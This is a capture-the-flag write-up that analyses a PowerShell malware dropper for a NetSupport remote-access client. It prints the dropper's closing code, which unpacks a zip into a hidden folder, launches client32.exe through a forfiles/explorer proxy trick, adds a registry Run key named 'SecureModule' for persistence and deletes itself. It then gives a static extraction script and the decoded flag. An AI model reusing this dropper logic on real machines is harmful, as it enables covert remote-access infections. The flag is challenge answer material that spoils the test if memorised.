- Similar to `Eco Friendly` challenge from Huntress 2024
- Large array of charcodes followed by logic to create a zip file

```sh
$ tail -27 netsupport
```

```powershell
[byte[]]$kKtyJL = $xϞzzghϞ + $mcZΛkϞπ + $RζπrMwGEQi
[IO.File]::WriteAllBytes($LjLSTACGF, $kKtyJL)
$weBRvm = [IO.Path]::ChangeExtension($LjLSTACGF, 'zip')
Rename-Item -Path $LjLSTACGF -NewName (Split-Path $weBRvm -Leaf) -Force -ErrorAction SilentlyContinue
$CRKaNcWH = Join-Path (Join-Path $env:USERPROFILE 'Documents') 'PwNRbgjSHr'
if (-not (Test-Path $CRKaNcWH)) { New-Item -ItemType Directory -Path $CRKaNcWH | Out-Null }
try { (Get-Item $CRKaNcWH).Attributes = 'Hidden' } catch { }
Start-Sleep (Get-Random -Min 3 -Max 6)
Expand-Archive -Path $weBRvm -DestinationPath $CRKaNcWH -Force
Remove-Item $weBRvm -Force -ErrorAction SilentlyContinue
$ziπbKVG = Join-Path $CRKaNcWH 'client32.exe'
Start-Sleep 10
if (Test-Path $ziπbKVG -PathType Leaf) {
    $wd = Split-Path $ziπbKVG -Parent
    $exe = $ziπbKVG
    try {
        $quoted = '"' + $exe + '"'
        $cmdLine = 'forfiles /p C:\Windows\System32 /m calc.exe /c "cmd /c start \"\" \"C:\Windows\explorer.exe\" ' + $quoted + ' \""'
        cmd.exe /c $cmdLine
    } catch { }
} else {
}
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$val = '"' + $ziπbKVG + '"'
Set-ItemProperty -Path $regPath -Name 'SecureModule' -Value $val -Force
Write-Host 'Finalizing...'
try { Remove-Item -Path $MyInvocation.MyCommand.Path -Force } catch {}%
```

- Replicate the zip creation process to obtain malicious files statically

**solve.py**

```python
import zipfile

with open('netsupport', 'r', encoding='utf-8', errors='ignore') as f:
    content = f.read()

pattern = '$xϞzzghϞ = @('
start = content.find(pattern) + len(pattern)
end = content.find(')', start)
byte_string = content[start:end]

kKtyJL = bytes(int(x.strip()) for x in byte_string.split(',') if x.strip().isdigit())

with open('extracted.zip', 'wb') as f:
    f.write(kKtyJL)

with zipfile.ZipFile('extracted.zip', 'r') as zip_ref:
    zip_ref.extractall('extracted')

print(f"Extracted {len(kKtyJL)} bytes to extracted/")
```

- Now we can search for a flag

```sh
$ grep -iR "flag"
...
extracted/download/CLIENT32.ini:Flag=ZmxhZ3tiNmU1NGQwYTBhNWYyMjkyNTg5YzM4NTJmMTkzMDg5MX0NCg==

$ echo 'ZmxhZ3tiNmU1NGQwYTBhNWYyMjkyNTg5YzM4NTJmMTkzMDg5MX0NCg==' | base64 -d
flag{b6e54d0a0a5f2292589c3852f1930891}
```
